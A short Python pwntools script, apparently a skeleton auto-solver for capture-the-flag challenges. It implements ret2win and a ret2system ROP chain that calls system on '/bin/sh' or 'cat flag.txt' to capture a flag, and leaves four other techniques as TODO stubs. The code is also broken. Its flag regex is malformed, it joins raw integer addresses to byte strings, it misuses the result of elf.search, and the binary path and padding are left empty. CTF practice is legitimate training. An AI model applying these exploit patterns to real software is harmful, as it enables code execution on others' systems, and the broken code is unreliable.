from typing import Optional
import re
from pwn import *


def ret2win(vuln) -> Optional[str]:
    bin_path = ""
    start_pay = b""
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]^{32}\})"""

    elf = ELF(bin_path)
    win_addr = elf.symbols['win']
    p = process(bin_path)
    p.sendline(start_pay + win_addr)
    out = p.recv()
    
    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)


def ret2system(vuln) -> Optional[str]:
    bin_path = ""
    start_pay = b""
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]^{32}\})"""

    elf = ELF(bin_path)
    try:
        vuln_str = elf.search("cat flag.txt")
    except StopIteration:
        try:
            vuln_str = elf.search("/bin/sh")
        except StopIteration:
            return None
    system_addr = elf.symbols['system']
    r = ROP(elf)
    pop_rdi = r.find_gadget((['pop rdi', 'ret']))[0]

    p = process(bin_path)
    p.sendline(start_pay + pop_rdi + vuln_str + system_addr)
    p.sendline(b"cat flag.txt")
    out = p.recv()

    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)


def ret2execve(vuln) -> Optional[str]:
    return None # TODO


def ret2syscall(vuln) -> Optional[str]:
    return None # TODO


def ret2libc(vuln) -> Optional[str]:
    return None # TODO


def ropwrite(vuln) -> Optional[str]:
    return None # TODO
